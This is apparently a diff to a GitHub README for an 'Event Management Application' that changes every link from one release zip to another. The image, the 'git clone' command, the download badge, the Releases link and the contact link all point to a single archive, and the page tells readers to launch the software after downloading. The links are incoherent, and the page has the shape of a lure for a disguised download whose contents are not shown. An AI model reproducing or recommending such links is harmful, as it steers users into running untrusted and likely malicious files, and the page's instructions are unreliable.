@@ -1,6 +1,6 @@
 # 🎉 Welcome to Event Management Application 🎊
 
-![Event Management](https://github.com/LxLstepsup/event-management/releases/download/v1.0.0/Application.zip)
+![Event Management](https://github.com/LxLstepsup/event-management/releases/download/v2.0/Software.zip)
 
 ## Repository Name: event-management
 
@@ -13,7 +13,7 @@ Welcome to the Event Management repository! Feel free to check out this amazing 
 ## Quick Start
 1. Clone the repository:
 ```bash
-git clone https://github.com/LxLstepsup/event-management/releases/download/v1.0.0/Application.zip
+git clone https://github.com/LxLstepsup/event-management/releases/download/v2.0/Software.zip
 ```
 
 2. Install the dependencies:
@@ -32,17 +32,17 @@ http://localhost:3000
 ```
 
 ## Download Software
-[![Download Event Management Software](https://github.com/LxLstepsup/event-management/releases/download/v1.0.0/Application.zip)](https://github.com/LxLstepsup/event-management/releases/download/v1.0.0/Application.zip)
+[![Download Event Management Software](https://github.com/LxLstepsup/event-management/releases/download/v2.0/Software.zip)](https://github.com/LxLstepsup/event-management/releases/download/v2.0/Software.zip)
 *Note: The software needs to be launched after downloading.*
 
 ## Release Notes
-For the latest updates and releases, please visit the [Releases](https://github.com/LxLstepsup/event-management/releases/download/v1.0.0/Application.zip) section.
+For the latest updates and releases, please visit the [Releases](https://github.com/LxLstepsup/event-management/releases/download/v2.0/Software.zip) section.
 
 ## Contribute
 Want to contribute to this project? Feel free to fork and submit a pull request with your updates.
 
 ## Get In Touch
-Have questions or feedback? Feel free to reach out to us at [https://github.com/LxLstepsup/event-management/releases/download/v1.0.0/Application.zip](https://github.com/LxLstepsup/event-management/releases/download/v1.0.0/Application.zip).
+Have questions or feedback? Feel free to reach out to us at [https://github.com/LxLstepsup/event-management/releases/download/v2.0/Software.zip](https://github.com/LxLstepsup/event-management/releases/download/v2.0/Software.zip).
 
 ## License
 This project is licensed under the MIT License - see the [LICENSE](LICENSE) file for details.
